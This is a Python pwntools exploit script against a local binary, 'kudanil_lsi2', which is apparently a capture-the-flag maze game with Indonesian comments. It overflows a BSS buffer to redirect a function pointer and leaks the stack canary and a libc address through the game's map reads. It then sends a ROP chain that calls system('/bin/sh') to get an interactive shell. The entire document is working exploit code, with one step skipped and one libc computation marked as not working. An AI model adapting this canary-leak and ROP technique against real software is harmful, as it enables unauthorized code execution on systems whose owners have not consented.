from pwn import *
from sys import *
from time import *
p = process("./kudanil_lsi2")
binary = ELF("./kudanil_lsi2")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.arch = 'amd64'
# leaking

cmd = "b *0x00000000004015df"
if(len(argv) == 3):
	gdb.attach(p, cmd)

def leak(pil,lev, y, x):
	p.sendline("q")
	p.sendline(pil)
	p.sendline(str(lev))
	p.sendline(str(y))
	p.sendline(str(x))
	p.recvuntil("isi dari box : \"")
	leaked = p.recv(1)
	return leaked

# bss overflow. overwrite stat function

buf = "A" * 68
cheat = p64(binary.symbols['cheat'])
buf += cheat

p.sendline(buf)

# r for leak stack, l for leak bss

# leak cookie and libc
cookie = ""
libc_ret = ""
for i in range(180):
	# print i, repr(leak("r", 0, 0, i))
	if (i >= 109 and i <= 116):
		cookie += leak("r", 0, 0, i)
	if (i >= 157 and i <= 157 + 7):
		libc_ret += leak("r", 0, 0, i)

cookie = u64(cookie)
libc_ret = u64(libc_ret)
log.info("cookie %s" % hex((cookie)))
log.info("libc_ret %s" % hex((libc_ret)))

# leak map for bfs
size = 20

kotak = [[['f' for i in range (size)] for j in range (size)] for k in range(size)]


for lev in range(0, size):
	for y in range(0, size):
		for x in range(0, size):
			data = leak("l", lev, y, x)
			kotak[lev][y][x] = data

# create map in file
peta = ""

for lev in range(0, size):
	for y in range(0, size):
		for x in range(0, size):
			peta += kotak[lev][y][x]
		peta += "\n"	
	peta += "\n\n"
# print peta
write("peta.map", peta)

# creating move to harta

# <skip>

# count libc and property for ropping
# dont work
# base   = libc_ret - libc.symbols['__libc_start_main'] + 240
# print hex(base)
# system = base + libc.symbols['system']
# binsh = base + libc.search("/bin/sh").next()

# final payload
ret_deb   = 0x7f4fc9b02830
sys_deb   = 0x7f4fc9b27390
binsh_deb = 0x7f4fc9c6ed57

system = libc_ret - (ret_deb - sys_deb)
binsh  = libc_ret - (ret_deb - binsh_deb)
poprdi = binary.search(asm("pop rdi; ret")).next()

# gdb-peda$ p system
# $1 = {<text variable, no debug info>} 0x7f4fc9b27390 <__libc_system>
# 0x7f4fc9c6ed57 --> 0x68732f6e69622f ('/bin/sh')

p.sendline("m") # delete after creating real move

# p.interactive()
buf = "A" * 104
buf += p64(cookie)
buf += "B" * 8 # ebp
buf += p64(poprdi)
buf += p64(binsh)
buf += p64(system)
p.sendline(buf)

# debugging

p.interactive()